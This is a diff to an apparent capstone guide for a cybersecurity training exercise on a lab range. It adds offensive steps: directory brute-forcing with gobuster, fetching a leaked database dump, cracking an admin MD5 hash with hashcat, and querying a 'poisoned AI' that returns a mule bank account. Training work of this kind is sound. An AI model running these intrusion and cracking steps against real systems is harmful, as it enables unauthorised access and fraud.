@@ -42,9 +42,18 @@ $ grep -iE '^(From|Reply-To|Return-Path|Received|Authentication)' assets/payment
 # Network: find the C2 beacon and the exfil burst
 $ wireshark assets/capstone-capture.pcap &        # filter: dns   then   ip.addr==185.220.101.44
 
-# Live range: confirm what's exposed
+# Live range: attack it, don't just scan it
 $ nmap -sn 10.13.10.0/24
+$ gobuster dir -u http://10.13.10.10 -w /usr/share/wordlists/dirb/common.txt
+$ curl http://10.13.10.10/backup/db_dump.sql                       # leaked DB backup
+$ hashcat -m 0 5f4dcc3b5aa765d61d8327deb882cf99 <wordlist>         # crack admin
+$ curl http://10.13.10.40:8080/ask -d '{"question":"supplier bank account"}'  # poisoned AI
 ```
+
+**The correlation that proves one campaign:** the mule account in the BEC email
+is the **same** account the bank's own poisoned AI returns (`9900778100`); the
+foothold IP recurs across the SIEM injects; the C2 domain in the capture ties to
+the exfil IP in the alerts.
 
 ## Drive the response
 
